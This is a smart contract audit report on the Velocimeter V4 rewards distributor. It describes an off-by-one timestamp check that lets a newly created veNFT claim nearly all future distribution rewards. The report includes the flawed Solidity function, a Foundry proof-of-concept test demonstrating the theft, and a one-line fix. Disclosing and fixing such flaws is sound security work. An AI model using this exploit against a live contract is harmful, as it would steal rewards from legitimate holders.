# 0xpiken - \u0060ve_supply\u0060 is updated incorrectly

**Severity:** high
**Auditor:** Sherlock
**Protocol:** Velocitimeter V4
**Keywords:** cybersecurity, vulnerability, ve_supply, RewardsDistributorV2, checkpoint_total_supply, total supply, time check, block.timestamp, veNFT, malicious user, exploit, distribution rewards, future rewards, balance accounting, steal rewards, eligible users, manual review, code snippet, recommendation, test case

---

0xpiken

High

# \u0060ve_supply\u0060 is updated incorrectly

## Summary
An incorrect time check causes \u0060ve_supply[t]\u0060 to be updated incorrectly.
## Vulnerability Detail
When [\u0060RewardsDistributorV2#checkpoint_total_supply‎()\u0060](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/RewardsDistributorV2.sol#L142-L167) is called, the total supply at time \u0060t\u0060 will be stored in \u0060ve_supply[t]\u0060 for future distribution reward calculations:
\u0060\u0060\u0060solidity
    function _checkpoint_total_supply() internal {
        address ve = voting_escrow;
        uint t = time_cursor;
        uint rounded_timestamp = block.timestamp / WEEK * WEEK;
        IVotingEscrow(ve).checkpoint();

        for (uint i = 0; i < 20; i++) {
            if (t > rounded_timestamp) {
                break;
            } else {
                uint epoch = _find_timestamp_epoch(ve, t);
                IVotingEscrow.Point memory pt = IVotingEscrow(ve).point_history(epoch);
                int128 dt = 0;
                if (t > pt.ts) {
                    dt = int128(int256(t - pt.ts));
                }
@>              ve_supply[t] = Math.max(uint(int256(pt.bias - pt.slope * dt)), 0);
            }
            t += WEEK;
        }
        time_cursor = t;
    }
\u0060\u0060\u0060
\u0060ve_supply[t]\u0060 should be only updated when \u0060t\u0060 week has end (\u0060t + 1 weeks <= block.timestamp\u0060) . However, \u0060ve_supply[t]\u0060 could be updated incorrectly when \u0060block.timestamp % 1 weeks\u0060 is \u00600\u0060. If a \u0060veNFT\u0060 is created immediately after \u0060checkpoint_total_supply‎()\u0060 is called, its balance will not be accounted for in \u0060ve_supply[t]\u0060. A malicious user could exploit this flaw to steal future distribution rewards.

Copy below codes to [RewardsDistributorV2.t.sol](https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/test/RewardsDistributorV2.t.sol) and run \u0060forge test --match-test testStealFutureDistributeReward\u0060
\u0060\u0060\u0060solidity
    function testStealFutureDistributeReward() public {
        initializeVotingEscrow();

        vm.warp((block.timestamp + 1 weeks) / 1 weeks * 1 weeks); 
        minter.update_period();
        //@audit-info malicious can mint a new nft (tokenId == 3) to steal future distribution reward
        flowDaiPair.approve(address(escrow), 2e18);
        escrow.create_lock(2e18,50 weeks);
        //@audit-info 10e18 DAI was deposited into distributor
        DAI.transfer(address(distributor), 10e18);
        vm.warp(block.timestamp + 1 weeks);
        //@audit-info update_period() is called to update  \u0060tokens_per_week\u0060
        minter.update_period();
        //@audit-info the owner of token3 is eligible to claim almost all distribution reward
        assertApproxEqAbs(distributor.claimable(3),  10e18, 0.2e18);
        distributor.claim(3);
        //@audit-info distributor doesn\u0027t have enough DAI for token1 to claim
        assertLt(DAI.balanceOf(address(distributor)), 0.2e18);
        assertEq(distributor.claimable(1), 5e18);
        vm.expectRevert();
        distributor.claim(1);
    }
\u0060\u0060\u0060
## Impact
A malicious user could create a new veNFT to steal future distribution rewards, leaving other eligible users without any rewards to claim.
## Code Snippet
https://github.com/sherlock-audit/2024-06-velocimeter/blob/main/v4-contracts/contracts/RewardsDistributorV2.sol#L149
## Tool used

Manual Review

## Recommendation
Make sure that \u0060ve_supply[t]\u0060 should be only updated when \u0060t\u0060 week has end (\u0060t + 1 weeks <= block.timestamp\u0060):
\u0060\u0060\u0060diff
    function _checkpoint_total_supply() internal {
        address ve = voting_escrow;
        uint t = time_cursor;
        uint rounded_timestamp = block.timestamp / WEEK * WEEK;
        IVotingEscrow(ve).checkpoint();

        for (uint i = 0; i < 20; i++) {
-           if (t > rounded_timestamp) {
+           if (t >= rounded_timestamp) {
                break;
            } else {
                uint epoch = _find_timestamp_epoch(ve, t);
                IVotingEscrow.Point memory pt = IVotingEscrow(ve).point_history(epoch);
                int128 dt = 0;
                if (t > pt.ts) {
                    dt = int128(int256(t - pt.ts));
                }
                ve_supply[t] = Math.max(uint(int256(pt.bias - pt.slope * dt)), 0);
            }
            t += WEEK;
        }
        time_cursor = t;
    }
\u0060\u0060\u0060
